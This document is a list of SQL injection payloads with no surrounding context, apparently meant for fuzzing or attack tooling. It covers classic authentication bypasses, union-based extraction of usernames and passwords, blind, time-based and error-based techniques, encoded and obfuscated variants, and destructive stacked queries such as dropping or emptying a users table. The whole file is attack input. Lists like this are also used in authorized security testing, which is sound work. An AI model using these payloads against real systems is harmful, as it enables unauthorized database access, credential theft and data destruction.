# SQL Injection Payloads
# Classic SQL injection
' OR '1'='1
' OR 1=1--
admin'--
admin' #

# Union-based
1' UNION SELECT NULL, NULL--
1' UNION SELECT username, password FROM users--
' UNION ALL SELECT NULL, NULL, NULL--

# Blind SQL injection
' AND 1=1--
' AND 1=2--
1' AND SLEEP(5)--
1' AND BENCHMARK(10000000,MD5('A'))--

# Boolean-based blind
1' AND (SELECT COUNT(*) FROM users) > 0--
1' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--

# Time-based blind
1'; WAITFOR DELAY '00:00:05'--
1' AND IF(1=1, SLEEP(5), 0)--

# Stacked queries
1'; DROP TABLE users--
1'; DELETE FROM users WHERE 1=1--

# Comment variations
1'/* comment */OR/**/1=1--
1'/**/UNION/**/SELECT/**/NULL--

# Case variations
' oR '1'='1
' UnIoN SeLeCt NULL--

# Encoded payloads
%27%20OR%20%271%27%3D%271
%27%20UNION%20SELECT%20NULL--

# Double encoding
%2527%20OR%20%25271%2527%253D%25271

# Error-based
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT username FROM users LIMIT 1),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

# Second-order
admin'||'
admin'+'

# String concatenation
' + 'a'='a
'||'1'='1

# Numeric injection
1 OR 1=1
1 AND 1=1
1 AND 1=2

# Subquery injection
1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
1' AND EXISTS(SELECT * FROM users)--
